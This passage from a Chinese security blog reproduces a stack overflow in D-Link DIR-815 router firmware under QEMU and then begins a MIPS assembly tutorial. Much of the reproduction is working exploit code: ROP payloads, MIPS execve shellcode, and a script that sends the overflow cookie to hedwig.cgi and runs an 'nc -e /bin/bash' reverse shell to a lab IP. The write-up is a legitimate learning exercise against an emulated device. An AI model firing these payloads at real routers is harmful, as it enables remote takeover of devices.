class="number">0xc</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x4e0ec</span>)<span class="comment">#$s5</span></span><br><span class="line">payload+=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xc</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x158c8</span>)<span class="comment">#$ra</span></span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&quot;/bin/sh;deadbeef;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line">f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211526368.png" alt="image-20230521152651843" style="zoom: 50%;" />

<p>可以发现这次是成功执行到了 <code>system(&quot;/bin/sh&quot;)</code> ，因为 <code>fork</code> 的原因，依然是拿不到 <code>shell</code></p>
<h5 id="ROP-ret2shellcode"><a href="#ROP-ret2shellcode" class="headerlink" title="ROP-ret2shellcode"></a>ROP-ret2shellcode</h5><p>明白了上面 <code>ROP</code> 的思想，那么布置 <code>shellcode</code> 也就不在话下，因为 <code>shellcode</code> 能直接调用 <code>execve</code> 从而不需要去使用 <code>fork</code>。不过需要注意的是 <code>shellcode</code> 中不能出现 <code>\x00</code> 还有缓存不一致性（数据缓存区和指令缓存区需要一个时间来同步），因此需要先调用一下 <code>sleep(1)</code> 再去执行 <code>shellcode</code>。</p>
<p>这里还需要提到一点，如果现在执行了 <code>gadgetA</code> ，然后跳转到了 <code>sleep(1)</code> 函数，等函数返回时会再跳转到了 <code>gadgetA</code>，因此必须要保证 <code>gadgetA</code> 回来后依然能去跳转到我们指定的地址，以此来保证 <code>ROP</code> 不间断。</p>
<p>画了个抽象的图（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305240902843.png" alt="image-20230524090213648" style="zoom: 67%;" />

<h6 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h6><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc_base=<span class="number">0x3ff38000</span></span><br><span class="line">sys_addr=libc_base+<span class="number">0x53200</span></span><br><span class="line">bin_sh_addr=libc_base+<span class="number">0x5a448</span></span><br><span class="line">sleep=libc_base+<span class="number">0x56bd0</span></span><br><span class="line">payload=<span class="string">b&quot;uid=&quot;</span>+<span class="string">b&#x27;c&#x27;</span>*(<span class="number">1007</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x4E0EC =&gt; move $a0,$s1 ; jalr $s0</span></span><br><span class="line"><span class="comment">#0x42f60 =&gt; addiu $a0,$sp,0x18 ;  jalr  $a0 </span></span><br><span class="line"><span class="comment">#0x4683C =&gt; move $a0,$s1  ;  jalr  $s3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0xB814  =&gt; addiu $a1,$sp,0x18  ;  jalr  $s1 </span></span><br><span class="line"><span class="comment">#-------------------------</span></span><br><span class="line"><span class="comment">#0xDEF0  =&gt; addiu $s2,$sp,0x10 ;  jalr  $s4 </span></span><br><span class="line"><span class="comment">#0x436D0 =&gt; move $t9,$s3 ; jalr $t9</span></span><br><span class="line"><span class="comment">#0x3F25C =&gt; jalr $s2</span></span><br><span class="line"><span class="comment">#0x57E50 =&gt; li $a0,1 ;  jalr  $s1 </span></span><br><span class="line"><span class="comment">#-------------------------</span></span><br><span class="line"><span class="comment">#0x158c8 =&gt; adddiu $s0,1  ; jalr $s5</span></span><br><span class="line"><span class="comment">#0x159cc =&gt; addiu $s5,$sp,0x10 ; move $a1,$a5 ;jalr $s0</span></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    slti $a2, $zero, -1</span></span><br><span class="line"><span class="string">    li $t7, 0x69622f2f</span></span><br><span class="line"><span class="string">    sw $t7, -12($sp)</span></span><br><span class="line"><span class="string">    li $t6, 0x68732f6e</span></span><br><span class="line"><span class="string">    sw $t6, -8($sp)</span></span><br><span class="line"><span class="string">    sw $zero, -4($sp)</span></span><br><span class="line"><span class="string">    la $a0, -12($sp)</span></span><br><span class="line"><span class="string">    slti $a1, $zero, -1</span></span><br><span class="line"><span class="string">    li $v0, 4011</span></span><br><span class="line"><span class="string">    syscall 0x40404</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)<span class="comment">#$s0</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x436d0</span>)<span class="comment">#$s1</span></span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)<span class="comment">#$s2</span></span><br><span class="line">payload+=p32(sleep)<span class="comment">#$s3</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x3f25c</span>)<span class="comment">#$s4</span></span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)<span class="comment">#$s5</span></span><br><span class="line">payload+=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xc</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x57e50</span>)<span class="comment">#$ra</span></span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)*<span class="number">10</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x3f25c</span>)<span class="comment">#$s4</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0xdef0</span>)<span class="comment">#second return address $ra</span></span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)*<span class="number">4</span></span><br><span class="line">payload+=shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211617086.png" alt="image-20230521161702923"></p>
<p>可以看到这次是拿到 <code>shell</code> 了。不过这里执行 <code>execve(&quot;/bin/sh&quot;)</code> 成功其实是一种假象，因为固件中的 <code>/bin/sh</code> 链接到了 <code>busybox</code> 上，虽然 <code>busybox</code> 是静态链接，但因为它是 <code>MIPS</code> 架构，导致了我在 <code>x64</code> 上直接执行是失败的。因此我上面是把原本的 <code>sh</code> 给删掉，换成了主机自带的 <code>x64</code> 架构的 <code>sh</code> ，同时还把相应的动态库都放到了当前的 <code>/lib</code> 下面，才算执行成功。不然用原本的 <code>sh</code> 还是执行失败，这么做的目的仅仅是为了证明这种操作理论上是可以拿到 <code>shell</code> 的 😎</p>
<h3 id="qemu-系统模式下复现"><a href="#qemu-系统模式下复现" class="headerlink" title="qemu 系统模式下复现"></a><code>qemu</code> 系统模式下复现</h3><p>只要在 <code>qemu</code> 用户模式下能复现成功，并且搞清楚原理，其实这个 <code>qemu</code> 系统模式搞的很快。首先实现一下 <code>qemu</code> 与宿主机的通信，然后把 <code>httpd</code> 服务启起来就可以发送数据包直接打了（在不遇到什么奇怪的报错下确实比较快…）</p>
<p>我这里的环境是 <code>ubuntu 18.04</code> <code>qemu-system-mipsel 7.2.0</code> </p>
<h4 id="实现宿主机与-qemu-的通信"><a href="#实现宿主机与-qemu-的通信" class="headerlink" title="实现宿主机与 qemu 的通信"></a>实现宿主机与 <code>qemu</code> 的通信</h4><p>创建一个 <code>net.sh</code> 脚本，我这里的网卡是 <code>ens33</code> ，如果是 <code>eth0</code>  的话，就把出现的 <code>ens33</code> 换成 <code>eth0</code> 即可，<code>chmod +x net.sh</code> 给文件可执行权限，然后 <code>./net.sh</code> 运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sudo ifconfig eth0 down                 <span class="comment"># 首先关闭宿主机网卡接口</span></span></span><br><span class="line">sudo brctl addbr br0                     # 添加一座名为 br0 的网桥</span><br><span class="line">sudo brctl addif br0 ens33                # 在 br0 中添加一个接口</span><br><span class="line">sudo brctl stp br0 off                   # 如果只有一个网桥，则关闭生成树协议</span><br><span class="line">sudo brctl setfd br0 1                   # 设置 br0 的转发延迟</span><br><span class="line">sudo brctl sethello br0 1                # 设置 br0 的 hello 时间</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     # 启用 br0 接口</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up    # 启用网卡接口</span><br><span class="line">sudo dhclient br0                        # 从 dhcp 服务器获得 br0 的 IP 地址</span><br><span class="line">sudo brctl show br0                      # 查看虚拟网桥列表</span><br><span class="line">sudo brctl showstp br0                   # 查看 br0 的各接口信息</span><br></pre></td></tr></table></figure>



<p>然后再执行如下几条命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">sudo tunctl -t tap0 -u root              # 创建一个 tap0 接口，只允许 root 用户访问</span><br><span class="line">sudo brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    # 启用 tap0 接口</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure>



<p>再用下面这个脚本启动</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></table></figure>

<p>这个 <code>mips</code> 内核还有镜像文件，之前师傅们上放的链接好像都失效了。这里是找 <strong>winmt</strong> 师傅要的一份，上传到网盘上了  链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1-qvt7pG0Tr91JKoH2elNdQ?pwd=l04v">https://pan.baidu.com/s/1-qvt7pG0Tr91JKoH2elNdQ?pwd=l04v</a><br>提取码：l04v</p>
<p>如果此时 <code>qemu</code> 中的网卡 <code>eth0</code> 是有 <code>ip</code> 的，并且能够 <code>ping</code> 通宿主机的 <code>ip</code>，那就能说明 <code>qemu</code> 已经能和宿主机进行通信了</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305212333766.png" alt="image-20230521233355276"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305212334427.png" alt="image-20230521233441258"></p>
<h4 id="启动-httpd-服务"><a href="#启动-httpd-服务" class="headerlink" title="启动 httpd 服务"></a>启动 <code>httpd</code> 服务</h4><p>在 <code>squashfs-root</code> 的上一级目录中，执行下面的命令， <code>IP</code> 换成 <code>qemu</code> 的。这样可以实现计算机远程之间的文件传输，作用就是把提取出来的文件系统传到 <code>qemu</code> 里面</p>
<p><code>sudo  scp -r ./squashfs-root root@10.214.140.139:/root/squashfs-root</code></p>
<p>然后在 <code>qemu</code> 中的 <code>squashfs-root</code> 目录下新建一个 <code>http_conf</code> 文件</p>
<p>写入以下代码（网卡和 <code>IP</code> <code>port</code> 要改成自己的）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">LogGMT On  #开启log</span><br><span class="line">ErrorLog /log #log文件</span><br><span class="line"></span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections 15</span><br><span class="line">    BufSize 12288</span><br><span class="line">    InputBufSize 4096</span><br><span class="line">    ScriptBufSize 4096</span><br><span class="line">    NumHeaders 100</span><br><span class="line">    Timeout 60</span><br><span class="line">    ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text/html    &#123; html htm &#125;</span><br><span class="line">        text/xml    &#123; xml &#125;</span><br><span class="line">        text/plain    &#123; txt &#125;</span><br><span class="line">        image/gif    &#123; gif &#125;</span><br><span class="line">        image/jpeg    &#123; jpg &#125;</span><br><span class="line">        text/css    &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; /dump &#125;</span><br><span class="line">        CGI            &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; map &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">    ServerName &quot;Linux, HTTP/1.1, &quot;</span><br><span class="line">    ServerId &quot;1234&quot;</span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth0  #对应qemu仿真路由器系统的网卡</span><br><span class="line">    Address 10.214.140.139 #qemu仿真路由器系统的IP</span><br><span class="line">    Port &quot;80&quot; #对应未被使用的端口</span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /</span><br><span class="line">            Location /htdocs/web</span><br><span class="line">            IndexNames &#123; index.php &#125;</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>然后在物理机上 <code>/opt/tools/mipsel</code> 目录（没有的话就自己创建吧）中新建 <code>init.sh</code> 文件，写入如下配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>给这个 <code>init.sh</code> ，可执行权限，然后将其执行</p>
<p>然后在 <code>qemu</code> 中的 <code>squashfs-root</code> 目录下创建 <code>init.sh</code> 文件，写入下面的内容。给可执行权限，然后执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">cp http_conf /</span><br><span class="line">cp sbin/httpd /</span><br><span class="line">cp -rf htdocs/ /</span><br><span class="line">mkdir /etc_bak</span><br><span class="line">cp -r /etc /etc_bak</span><br><span class="line">rm /etc/services</span><br><span class="line">cp -rf etc/ /</span><br><span class="line">cp lib/ld-uClibc-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libcrypt-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libc.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so.1  /lib/</span><br><span class="line">cp lib/ld-uClibc.so.0  /lib/</span><br><span class="line">cp lib/libcrypt.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so  /lib/</span><br><span class="line">cp lib/libuClibc-0.9.30.1.so  /lib/</span><br><span class="line">cd /</span><br><span class="line">rm -rf /htdocs/web/hedwig.cgi</span><br><span class="line">rm -rf /usr/sbin/phpcgi</span><br><span class="line">rm -rf /usr/sbin/hnap</span><br><span class="line">ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line">ln -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line">ln -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line">./httpd -f http_conf</span><br></pre></td></tr></table></figure>



<p>最后进到 <code>/squashfs-root/sbin</code> 目录下，执行 <code>./httpd -f /root/squashfs-root/http_conf</code></p>
<p>在宿主机中访问 <code>http://10.214.140.139/hedwig.cgi</code> 发现可以正常访问了（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305220922344.png" alt="image-20230522092237155"></p>
<p>开启 <code>httpd</code> 服务后，如果要进行调试则需要下载一个 <a target="_blank" rel="noopener" href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver">gdbserver.mipsle</a> ，然后再用 <code>scp</code> 命令将其上传到 <code>qemu</code> 中的 <code>/root/squashfs-root/</code> 目录下。</p>
<p>在 <code>qemu</code> 中 <code>/root/squashfs-root/</code> 目录下新建 <code>run.sh</code> 脚本（<code>IP</code> 改成宿主机的，端口）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">export CONTENT_LENGTH=&quot;11&quot;</span><br><span class="line">export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">export HTTP_COOKIE=&quot;uid=`cat payload`&quot;</span><br><span class="line">export REQUEST_METHOD=&quot;POST&quot;</span><br><span class="line">export REQUEST_URI=&quot;2333&quot;</span><br><span class="line">echo &quot;winmt=pwner&quot;|./gdbserver.mipsle 10.214.140.140:7788 /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;winmt=pwner&quot;</span>|/htdocs/web/hedwig.cgi</span></span><br><span class="line">unset CONTENT_LENGTH</span><br><span class="line">unset CONTENT_TYPE</span><br><span class="line">unset HTTP_COOKIE</span><br><span class="line">unset REQUEST_METHOD</span><br><span class="line">unset REQUEST_URI</span><br></pre></td></tr></table></figure>

<p>正常情况下应该是能从宿主机中调试 <code>qemu</code> 中的程序，但我这里报了这个错误（折腾了很久也没有解决，于是就暂时放弃了远程调试的想法）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305221824553.png" alt="image-20230522182439980" style="zoom:50%;" />



<p>不过还有一个方法也能确定 <code>libc</code> 基地址，就是用运行 <code>hedwig.cgi</code> 后进行后台挂起，然后用 <code>cat /proc/pid/maps</code> 查看，先跑几次程序，发现 <code>pid</code> 的增长是有规律的，于是提前预测一下，多尝试几次就能打印出来内存布局获取 <code>libc</code> 基地址（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305221542829.png" alt="image-20230522154245358"></p>
<p>因为没法调试，这里就直接用网上师傅的脚本打了（主要用户模式已经写了好几种脚本，这个没法调试的问题死活解决不了，导致了没法调试 <code>rop</code>的布局）思路和用户模式 <code>ROP-system</code> 的那个脚本是一样的，就把命令换成反弹 <code>shell</code> 的命令即可</p>
<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload</span>(<span class="params">offset, libc_base, cmd</span>):</span><br><span class="line">    Calcsystem = <span class="number">0x158c8</span>    <span class="comment"># $s0 add 1, jalr $s5</span></span><br><span class="line">    Callsystem = <span class="number">0x159cc</span>    <span class="comment"># &#x27;/bin/sh&#x27; -&gt; $a0, jalr system</span></span><br><span class="line">    system_addr_1 = <span class="number">0x53200</span> - <span class="number">1</span></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * offset  <span class="comment"># 973</span></span><br><span class="line">    payload += p32(libc_base + system_addr_1)  <span class="comment"># s0     977</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s1     981</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s2     985</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s3     989</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s4     993</span></span><br><span class="line">    payload += p32(libc_base + Callsystem)     <span class="comment"># s5     997</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s6     1001</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s7     1005</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># fp     1009</span></span><br><span class="line">    payload += p32(libc_base + Calcsystem)     <span class="comment"># ra</span></span><br><span class="line">    payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">    payload += cmd</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd = <span class="string">b&quot;nc -e /bin/bash 10.214.140.144 7788&quot;</span></span><br><span class="line">    cookie = <span class="string">b&#x27;uid=&#x27;</span> + get_payload(<span class="number">973</span>, <span class="number">0x2aaf8000</span>, cmd)</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: cookie,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;100&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;<span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;x&#x27;</span>&#125;</span><br><span class="line">    ip_port = sys.argv[<span class="number">1</span>]</span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span> + ip_port + <span class="string">&quot;/hedwig.cgi&quot;</span></span><br><span class="line">    r = requests.post(url=url, headers=header, data=data)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>可以看到是已经将 <code>qemu</code> 中模拟的环境 <code>shell</code> 反弹到了宿主机上。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305221606264.png" alt="image-20230522160633923"></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272318.htm">从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/unr4v31/p/16072562.html">DLink 815路由器栈溢出漏洞分析与复现 - unr4v31 - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44223394/article/details/128756188">从零到一：复现 DIR-815 栈溢出漏洞_Y6blNU1L的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jasonactions/article/details/118931633">qemu与宿主机网络通信配置_ubuntu主机和qemu网络互通_HZero.chen的博客-CSDN博客</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/919c29c4.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/919c29c4.html" class="post-title-link" itemprop="url">IOT安全入门学习--MIPS汇编基础</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 15:51:54 / 修改时间：22:45:10" itemprop="dateCreated datePublished" datetime="2023-05-15T15:51:54+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/IOT%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>说下学习 <code>MIPS</code> 汇编基础的思路，作为一个接触新知识面的小白，我首先去查了一下如何编译 <code>MIPS</code> 架构的程序，然后自己写了一个简单的代码，放入 <code>IDA</code> 后开始进行汇编代码的学习，遇见一条指令就学习一条指令，为了观察更细致的内存变化同时还要学习如何用 <code>gdb</code> 来进行 <code>MIPS</code> 架构程序的调试。在这个过程中记录见到的汇编指令和寄存器等等，接着是函数调用约定的学习，参考着网上的文章再结合 <code>gdb</code> 调试基本就能理解透彻。感觉对 <code>MIPS</code> 汇编基础和函数调用约定已经得心应手，就可以做一些 <code>PWN</code> 题以此来稳固打下的基础，最后尝试来手写各种的 <code>shellcode</code>。希望这个思路能给之后自学者一点借鉴。</p>
<p>下面先让我们编译运行自己的第一个 <code>MIPS</code> 架构的程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mips-linux-gnu-gcc demo.c -o demo -static -g</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> value=a+b;</span><br><span class="line">	<span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> c=sum(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;value ==&gt; %d\n&quot;</span>,c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="启动与调试"><a href="#启动与调试" class="headerlink" title="启动与调试"></a>启动与调试</h3><h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><p>如果是小端序的程序使用 <code>qemu-mipsel ./xxx</code> 运行程序，如果是大端序的程序用 <code>qemu-mips ./xxx</code> 运行程序 </p>
<p>补充：</p>
<ol>
<li>如果运行动态链接的程序，可能会遇见一些报错， 这里的 <a href="#%E8%A7%A3%E5%86%B3%E6%8A%A5%E9%94%99">解决方法</a> 或许会对你有所帮助</li>
<li>使用 <code>readelf -h xxx</code> 可以查看程序的字节序</li>
</ol>
<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>调试分为 <strong>直接调试程序</strong>  和 <strong>加载进程调试</strong></p>
<h5 id="直接调试程序"><a href="#直接调试程序" class="headerlink" title="直接调试程序"></a>直接调试程序</h5><p>假设要调试的程序叫做 <code>demo</code> （大端序），那么在终端执行 <code>qemu-mips -g 1234 ./demo</code></p>
